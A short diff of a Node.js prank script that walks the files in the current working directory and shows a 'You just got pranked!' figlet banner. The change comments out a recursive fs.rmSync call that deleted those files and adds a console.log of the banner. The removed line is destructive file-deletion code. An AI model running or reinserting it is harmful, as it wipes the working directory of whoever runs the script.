@@ -26,12 +26,13 @@ fs.readdir(process.cwd(), async (err, files) => {
     //     if (err) throw err;
     //   });
     // }
-    fs.rmSync(path_string, { recursive: true });
+    // fs.rmSync(path_string, { recursive: true });
   }
   // const badLBozoRatio = await figlet("You just got pranked!");
   // console.log(badLBozoRatio);
   // chalkAnimation.rainbow(figlet("You just got pranked!"));
   figlet("You just got pranked!", (err, data) => {
+    console.log(data);
     chalkAnimation.rainbow(data);
   });
 });
